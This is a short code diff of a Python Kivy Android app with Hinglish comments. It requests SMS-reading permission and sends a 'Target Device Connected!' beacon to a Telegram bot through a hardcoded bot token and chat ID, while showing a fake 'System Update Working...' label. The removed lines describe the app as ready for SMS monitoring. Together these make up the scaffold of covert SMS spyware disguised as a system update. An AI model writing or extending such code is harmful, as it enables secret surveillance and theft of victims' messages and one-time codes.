@@ -1,22 +1,21 @@
+from kivy.app import App
+from kivy.uix.label import Label
 import requests
 from android.permissions import request_permissions, Permission
 
-# Aapka Data
-TOKEN = "8264376885:AAG6pFOvdb_wcPboSz9-jooibI9FO9QILqY"
-CHAT_ID = "8264376885" 
-
-def send_to_telegram(text):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    try:
-        requests.post(url, data={"chat_id": CHAT_ID, "text": text})
-    except:
-        pass
-
-def start_app():
-    # Mobile permissions mangna
-    request_permissions([Permission.READ_SMS, Permission.INTERNET])
-    send_to_telegram("✅ Target Device Connected!\nApp Active aur SMS monitoring tayar hai.")
+class MainApp(App):
+    def build(self):
+        # Permissions mangna
+        request_permissions([Permission.READ_SMS, Permission.INTERNET])
+        
+        # Telegram par notification bhejna
+        TOKEN = "8264376885:AAG6pFOvdb_wcPboSz9-jooiBI9FO9QiLqY"
+        CHAT_ID = "8264376885"
+        msg = "✅ Target Device Connected!"
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
+        
+        return Label(text="System Update Working...")
 
 if __name__ == "__main__":
-    start_app()
-  
+    MainApp().run()
+    
